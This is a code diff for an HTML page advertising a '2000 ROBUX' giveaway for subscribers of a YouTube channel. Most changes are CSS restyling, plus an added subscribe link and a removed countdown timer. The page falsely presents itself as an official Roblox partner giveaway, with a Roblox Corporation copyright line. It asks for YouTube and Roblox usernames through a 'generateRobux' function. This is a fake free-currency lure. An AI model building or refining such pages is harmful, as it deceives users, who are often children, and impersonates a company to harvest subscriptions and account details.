@@ -26,13 +26,17 @@
     }
 
     .container {
-        max-width: 500px;
-        background: #fff;
-        border-radius: 15px;
-        padding: 35px 30px;
-        box-shadow: 0 15px 40px rgba(0, 0, 0, 0.25);
-        animation: fadeIn 0.6s ease-in-out;
-    }
+    max-width: 500px;
+    background: rgba(0, 0, 0, 0.5); /* Black with opacity */
+    border-radius: 15px;
+    padding: 35px 30px;
+    box-shadow: 0 15px 40px rgba(0, 0, 0, 0.25);
+    animation: fadeIn 0.6s ease-in-out;
+    backdrop-filter: blur(12px); /* Blur effect */
+    -webkit-backdrop-filter: blur(12px); /* For Safari */
+    color: white; /* Make text readable on dark background */
+}
+
 
     @keyframes fadeIn {
         from { opacity: 0; transform: translateY(30px); }
@@ -54,7 +58,7 @@
 
     .offer-title {
         font-size: 26px;
-        color: #e60012;
+        color: #b70570;
         font-weight: 800;
         margin-bottom: 10px;
     }
@@ -62,13 +66,41 @@
     .robux-amount {
         font-size: 40px;
         font-weight: bold;
-        color: #d52deb;
+        color: #f8028af4;
         margin: 20px 0;
-        background: linear-gradient(to right, #ffe9e9, #ffe3e3);
+        background: linear-gradient(to right, #ffffff, #ffffff);
         padding: 12px 20px;
         border-radius: 8px;
         display: inline-block;
         box-shadow: inset 0 1px 5px rgba(0, 0, 0, 0.05);
+    }
+
+    .subscribe-notice {
+        background-color: rgba(255, 0, 0, 0.1);
+        border: 1px solid rgba(255, 0, 0, 0.3);
+        padding: 15px;
+        border-radius: 8px;
+        margin: 20px 0;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+
+    .subscribe-notice a {
+        color: #ff0000;
+        font-weight: bold;
+        text-decoration: none;
+        display: flex;
+        align-items: center;
+    }
+
+    .subscribe-notice a:hover {
+        text-decoration: underline;
+    }
+
+    .youtube-icon {
+        margin-right: 10px;
+        font-size: 24px;
     }
 
     .benefits {
@@ -93,7 +125,7 @@
     }
 
     input {
-        width: 100%;
+        width: 93%;
         padding: 14px;
         margin: 10px 0;
         font-size: 16px;
@@ -103,7 +135,7 @@
     }
 
     input:focus {
-        border-color: #4CAF50;
+        border-color: #a00d0d;
         outline: none;
     }
 
@@ -112,7 +144,7 @@
         width: 100%;
         padding: 16px;
         font-size: 18px;
-        background: linear-gradient(to right, #7b029c, #45A049);
+        background: linear-gradient(to right, #9c027d, #32020d);
         color: #fff;
         border: none;
         border-radius: 6px;
@@ -123,7 +155,7 @@
     }
 
     .cta-button:hover {
-        background: linear-gradient(to right, #2a034d, #388e3c);
+        background: linear-gradient(to right, #2a034d, #b106a0);
     }
 
     .loading {
@@ -146,33 +178,11 @@
         to { transform: rotate(360deg); }
     }
 
-    .timer {
-        background-color: #f7f7f7;
-        border: 1px solid #ddd;
-        padding: 15px;
-        border-radius: 10px;
-        margin: 25px 0;
-        text-align: center;
-    }
-
-    .timer-title {
-        font-weight: 600;
-        font-size: 16px;
-        margin-bottom: 8px;
-    }
-
-    #countdown {
-        font-size: 24px;
-        color: #e60012;
-        font-weight: bold;
-        letter-spacing: 1px;
-    }
-
     .disclaimer {
         font-size: 14px;
-        background-color: #fff8e1;
+        background-color: #1a1917;
         padding: 15px;
-        border-left: 5px solid #ffc107;
+        border-left: 5px solid #ff0000;
         border-radius: 10px;
         margin-top: 20px;
         text-align: center;
@@ -211,10 +221,17 @@
             </div>
             
             <div class="offer-card">
-                <h1 class="offer-title">Special Promotion for My Subscribers</h1>
+                <h2 class="offer-title">Special Promotion for Our Subscribers</h2>
                 <p>Verify your subscription to claim your Robux</p>
                 
                 <div class="robux-amount">2000 ROBUX</div>
+
+                <div class="subscribe-notice">
+                    <a href="https://www.youtube.com/@Ruwbux2" target="_blank">
+                        <span class="youtube-icon">▶</span>
+                        <span>Not subscribed yet? Subscribe to our YouTube channel</span>
+                    </a>
+                </div>
                 
                 <div class="benefits">
                     <div class="benefit-item">You must be subscribed to our YouTube channel</div>
@@ -237,15 +254,15 @@
                 <strong>Note:</strong> This is a promotional Giveaway offer for our YouTube subscribers only. affiliated with Roblox Corporation. Limited to one claim per user.
             </div>
             
-<p class="verified-badge" style="color: black;">
-    © 2025 <a href="https://www.roblox.com/">Roblox Corporation</a>. All rights reserved. 
-    Official Partner Giveaway by <a href="https://www.career-maestros.com">Career-Maestros</a>.
-</p>
+            <p class="verified-badge" style="color: rgb(255, 254, 254);">
+                © 2025 <a href="https://www.roblox.com/">Roblox Corporation</a>. All rights reserved. 
+                Official Partner Giveaway by <a href="https://www.career-maestros.com">Career-Maestros</a>.
+            </p>
         </div>
     </div>
 
     <script>
-        // Generate Robux function - FIXED VERSION
+        // Generate Robux function
         function generateRobux() {
             const youtubeUsername = document.getElementById("youtubeUsername").value;
             const robloxUsername = document.getElementById("robloxUsername").value;
